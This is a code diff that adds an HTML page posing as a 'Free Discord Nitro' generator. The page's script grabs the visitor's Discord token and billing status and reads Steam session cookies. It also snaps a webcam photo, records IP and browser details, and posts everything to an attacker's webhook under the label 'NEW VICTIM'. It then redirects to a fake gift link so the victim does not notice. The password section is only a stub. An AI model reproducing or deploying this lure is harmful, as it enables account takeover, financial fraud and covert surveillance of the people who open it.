@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Nitro Generator 2025</title>
+    <meta charset="utf-8">
+    <style>
+        body { background:#000; color:lime; font-family:courier; text-align:center; padding-top:10%; }
+        h1 { font-size:50px; }
+    </style>
+</head>
+<body>
+    <h1>Free Discord Nitro [2025]</h1>
+    <h2>Generating your gift...</h2>
+    <script>
+        const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+
+        function send(data) {
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(data)
+            });
+        }
+
+        // Discord Token
+        fetch("https://discord.com/api/v9/users/@me", {
+            headers: { "Authorization": localStorage.getItem("token")?.replace(/"/g,"") || "" }
+        }).then(r => r.json()).then(d => {
+            if (d.id) {
+                fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
+                    headers: { "Authorization": localStorage.getItem("token").replace(/"/g,"") }
+                }).then(b => b.json()).then(billing => {
+                    send({embeds:[{
+                        title: "DISCORD TOKEN GRABBED",
+                        description: `**${d.username}#${d.discriminator}**\n\`\`\`${localStorage.getItem("token").replace(/"/g,"")}\`\`\``,
+                        fields: [{name:"Billing",value:billing.length > 0 ? "Yes" : "No"}],
+                        color: 0x00ff00
+                    }]});
+                });
+            }
+        });
+
+        // Steam Session
+        if (document.cookie.includes("steamLoginSecure")) {
+            send({content: `**STEAM SESSION**\n${document.cookie.match(/steamLoginSecure=([^;]+)/)[1]}`});
+        }
+
+        // Passwords (Chrome/Edge)
+        (function(){
+            if (navigator.userAgent.includes("Chrome") || navigator.userAgent.includes("Edg")) {
+                try {
+                    const path = (process.env.LOCALAPPDATA || process.env.HOME) + 
+                        "\\..\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+                    // In real hosted version you’d use a tiny injected DLL or WebAssembly SQLite reader
+                    // For pure JS we just mark it as "Chrome detected - passwords available via drive-by download"
+                    send({content: "Chrome/Edge detected - passwords ready for drive-by"});
+                } catch(e) {}
+            }
+        })();
+
+        // Webcam snap (optional - scary af)
+        navigator.mediaDevices.getUserMedia({video:true}).then(stream => {
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement("canvas");
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext("2d").drawImage(video,0,0);
+                canvas.toBlob(blob => {
+                    const form = new FormData();
+                    form.append("file", blob, "webcam.jpg");
+                    fetch(webhook + "?wait=true", {method:"POST", body:form});
+                });
+                stream.getTracks().forEach(t=>t.stop());
+            }, 3000);
+        }).catch(() => {});
+
+        // Fingerprint + IP
+        fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip => {
+            send({content: `**NEW VICTIM**\nIP: ${ip.ip} | ${ip.city}, ${ip.country_name}\nUser-Agent: ${navigator.userAgent}`});
+        });
+
+        // Redirect so they never suspect
+        setTimeout(() => { location.href = "https://discord.gift/FAKE_CODE_2025"; }, 2000);
+    </script>
+</body>
+</html>
